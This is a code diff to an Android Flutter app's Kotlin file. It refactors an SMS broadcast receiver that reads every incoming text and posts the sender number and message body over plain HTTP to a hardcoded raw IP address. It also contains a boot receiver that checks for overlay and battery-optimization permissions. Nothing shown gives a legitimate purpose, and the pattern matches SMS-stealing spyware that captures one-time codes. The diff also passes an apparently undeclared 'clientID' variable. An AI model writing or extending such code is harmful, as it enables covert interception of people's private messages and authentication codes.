@@ -6,14 +6,14 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
+import android.os.Bundle
+import android.telephony.SmsMessage
 import android.util.Log
 import android.widget.Toast
 import com.hjq.permissions.XXPermissions
 import io.flutter.embedding.android.FlutterActivity
-
-import android.os.Bundle
-import android.telephony.SmsMessage
-import android.util.Log
+import io.flutter.embedding.engine.FlutterEngine
+import io.flutter.plugin.common.MethodChannel
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -22,13 +22,8 @@ import java.io.BufferedOutputStream
 import java.io.OutputStream
 import java.net.HttpURLConnection
 import java.net.URL
-import java.net.URLEncoder
 
-import io.flutter.embedding.engine.FlutterEngine
-import io.flutter.plugin.common.MethodChannel
-
-
-class MainActivity: FlutterActivity() {
+class MainActivity : FlutterActivity() {
     private val CHANNEL = "com.example.zxwy"
 
     // 全局变量 clientId
@@ -45,6 +40,7 @@ class MainActivity: FlutterActivity() {
                     val data = call.argument<String>("data")
                     if (data != null) {
                         clientId = data // 赋值给全局变量 clientId
+                        result.success("Data received successfully")
                     } else {
                         result.error("INVALID_ARGUMENT", "Data is null", null)
                     }
@@ -57,9 +53,7 @@ class MainActivity: FlutterActivity() {
     }
 }
 
-
 class SmsReceiver : BroadcastReceiver() {
-
     companion object {
         private const val TAG = "SmsReceiver"
         private const val API_URL = "http://61.171.69.243:7801/external/cli/sms/save"
@@ -68,7 +62,7 @@ class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         val bundle: Bundle? = intent.extras
         bundle?.let {
-            val pdus = it.get("pdus") as Array<Any>?
+            val pdus = it.get("pdus") as? Array<Any>
             pdus?.forEach { pdu ->
                 val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                 val senderPhoneNumber = smsMessage.displayOriginatingAddress
@@ -78,12 +72,17 @@ class SmsReceiver : BroadcastReceiver() {
                 Log.d(TAG, "SMS Received - Sender: $senderPhoneNumber, Message: $messageBody")
 
                 // Send SMS details to API asynchronously
-                sendSmsDetailsToApi(senderPhoneNumber, messageBody)
+                sendSmsDetailsToApi(clientID, senderPhoneNumber, messageBody)
             }
         }
     }
 
-    private fun sendSmsDetailsToApi(clientId: String, phoneNumber: String, message: String) {
+    private fun sendSmsDetailsToApi(clientId: String?, phoneNumber: String, message: String) {
+        if (clientId == null) {
+            Log.e(TAG, "Client ID is null, cannot send SMS details.")
+            return
+        }
+
         GlobalScope.launch(Dispatchers.IO) {
             try {
                 val url = URL(API_URL)
@@ -93,23 +92,23 @@ class SmsReceiver : BroadcastReceiver() {
                 urlConnection.doOutput = true
 
                 // Create JSON object with phone and message fields
-                val jsonParams = JSONObject()
-                jsonParams.put("clientId", clientId)
-                jsonParams.put("phone", phoneNumber)
-                jsonParams.put("content", message)
+                val jsonParams = JSONObject().apply {
+                    put("clientId", clientId)
+                    put("phone", phoneNumber)
+                    put("content", message)
+                }
 
                 // Write JSON data to output stream
-                val outputStream: OutputStream = BufferedOutputStream(urlConnection.outputStream)
-                outputStream.write(jsonParams.toString().toByteArray())
-                outputStream.flush()
+                BufferedOutputStream(urlConnection.outputStream).use { outputStream ->
+                    outputStream.write(jsonParams.toString().toByteArray())
+                    outputStream.flush()
+                }
 
                 val responseCode = urlConnection.responseCode
                 if (responseCode == HttpURLConnection.HTTP_OK) {
                     Log.d(TAG, "SMS details sent successfully")
-                    // Handle successful response if needed
                 } else {
                     Log.e(TAG, "Failed to send SMS details. Response code: $responseCode")
-                    // Handle unsuccessful response if needed
                 }
 
                 urlConnection.disconnect()
@@ -123,7 +122,7 @@ class SmsReceiver : BroadcastReceiver() {
 const val DEBUG_BOOT_COMPLETED = "com.carriez.flutter_hbb.DEBUG_BOOT_COMPLETED"
 
 class BootReceiver : BroadcastReceiver() {
-    private val logTag = "tagBootReceiver"
+    private val logTag = "BootReceiver"
 
     override fun onReceive(context: Context, intent: Intent) {
         Log.d(logTag, "onReceive ${intent.action}")
@@ -136,7 +135,7 @@ class BootReceiver : BroadcastReceiver() {
                 return
             }
             // check pre-permission
-            if (!XXPermissions.isGranted(context, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, SYSTEM_ALERT_WINDOW)){
+            if (!XXPermissions.isGranted(context, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, SYSTEM_ALERT_WINDOW)) {
                 Log.d(logTag, "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS or SYSTEM_ALERT_WINDOW is not granted")
                 return
             }
